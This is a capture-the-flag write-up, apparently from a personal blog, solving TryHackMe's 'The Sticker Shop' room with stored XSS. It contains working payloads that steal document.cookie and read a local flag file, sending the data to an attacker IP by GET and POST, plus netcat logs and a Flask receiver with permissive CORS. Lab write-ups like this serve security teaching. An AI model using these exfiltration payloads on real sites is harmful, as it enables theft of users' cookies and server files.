---
title: "The Sticker Shop"
date: 2024-11-29T16:02:41-06:00
draft: false
tags:
- THM
- XSS
- Web Exploitation
---

![The Sticker Shop](/img/the_sticker_shop/the_sticker_shop.png#center)

## Description
[The Sticker Shop](https://tryhackme.com/r/room/thestickershop) is an easy-rated challenge on Tryhackme. We exfiltrate ```flag.txt``` from the web server through a XSS attack.


## Walkthrough
We are told that we need to read the flag at ```http://10.10.102.204:8080/flag.txt```. However, visiting the URL, we are met with a 401 Unauthorized message, meaning we are not authenticated to view the file.

![Direct access 401 forbidden](/img/the_sticker_shop/401.png)

If we backtrack to the webapp's homepage, we see that there is a page for submitting feedback where we can presumably send content to the sticker shop staff. This might be our way in.

![](/img/the_sticker_shop/feedback.png)

I started by sending a simple XSS payload to attempt to exfiltrate user cookies.

```html
<script>new Image().src="http://10.13.48.55/?c="+document.cookie</script>
```

```
┌──(kali㉿kali)-[/tmp]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.102.204 - - [29/Nov/2024 19:56:47] "GET /?c= HTTP/1.1" 200 -
10.10.102.204 - - [29/Nov/2024 19:56:58] "GET /?c= HTTP/1.1" 200 -
```

Unfortunately, this does not work. The webapp may have some sort of defense mechanism (e.g. HttpOnly). Heck, it may not be using cookies at all. Without further information, it will be difficult to obtain any account secrets, if they exist in the first place. We need to focus on directly accessing ```flag.txt``` through our XSS payload instead. 

A quick and dirty way of doing this would be embedding ```flag.txt```'s contents into a query string. Below is a payload that reads ```flag.txt``` on the server side and sends the data back to us with a GET request.

```html
<script>
    function sendData(data) {
        const url = new URL("http://10.13.48.55");
        url.searchParams.append("data", data);
        fetch(url)
    }

    fetch("http://127.0.0.1:8080/flag.txt")
        .then(response => response.text())
        .then(data => {
            sendData(data);
        })
</script>
```

![Quick and dirty GET flag](/img/the_sticker_shop/flag_get.png)

---
## Beyond Pwn

But what if you want to read a file that is much larger, or you don't want the data to be visible in the URL, perhaps for greater stealth? In that case, you would be better off using POST instead of GET.
For unstructured data, sending data as plaintext will suffice.

```html
<script>
    function sendData(data){
        fetch("http://10.13.48.55", {
            method: "POST",
            headers: {
                "Content-Type": "text/plain"
            },
            body: data
        })
    }

    fetch("http://127.0.0.1:8080/flag.txt")
        .then(response => response.text())
        .then(data => {
            sendData(data)
        })
</script>
```

```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.102.204] 60968
POST / HTTP/1.1
Host: 10.13.48.55
Connection: keep-alive
Content-Length: 45
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Content-Type: text/plain
Accept: */*
Origin: http://127.0.0.1:8080
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate

THM{<flag>}
```

For structured data, using json may be a better option.

```html
<script>
    function sendData(data){
        fetch("http://10.13.48.55", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        })
    }

    fetch("http://127.0.0.1:8080/flag.txt")
        .then(response => response.text())
        .then(data => {
            sendData(data)
        })
</script>
```

The problem is that the POST request is no longer "simple" because the content type is now ```application/json```, so the browser now sends a preceding preflight request, meaning netcat is out of the question...

```
┌──(kali㉿kali)-[/tmp]
└─$ nc -nvlp 80
listening on [any] 80 ...
connect to [10.13.48.55] from (UNKNOWN) [10.10.102.204] 52614
OPTIONS / HTTP/1.1
Host: 10.13.48.55
Connection: keep-alive
Accept: */*
Access-Control-Request-Method: POST
Access-Control-Request-Headers: content-type
Origin: http://127.0.0.1:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/119.0.6045.105 Safari/537.36
Sec-Fetch-Mode: cors
Referer: http://127.0.0.1:8080/
Accept-Encoding: gzip, deflate
```

We need to respond appropriately in order to receive the POST request containing ```flag.txt```. Specifically, we need to respond with the correct ```Access-Control-Allow-Origin```, ```Access-Control-Allow-Methods```, and ```Access-Control-Allow-Headers``` headers.

```
Access-Control-Allow-Origin: Specifies what domains are allowed to access a resource.
Access-Control-Allow-Methods: Indicates which HTTP methods are allowed.
Access-Control-Allow-Headers: Represents the HTTP headers that are permitted.
```

Now to whitelist any origin[^1], the HTTP POST and OPTIONS, as well as the Content-Type header. I spun up a Flask server to do this:

[^1]: The request from flag shop comes from a random high port and there is no built-in method in CORS for wildcard port matching.

```python
from flask import Flask, request


app = Flask(__name__)

@app.route('/', methods=['POST', 'OPTIONS'])
def handler():
    if request.method == 'OPTIONS':
        headers = {
                'Access-Control-Allow-Origin' : '*',
                'Access-Control-Allow-Methods' : 'POST, OPTIONS',
                'Access-Control-Allow-Headers' : 'Content-Type'
        }
        return '', 200, headers

    elif request.method == 'POST':
        data = request.get_json()
        print(data)
        return '', 200

    return '', 405

if __name__ == '__main__':
    app.run()
```

And now, we should successfully receive our flag.

![POST flag](/img/the_sticker_shop/flag.png)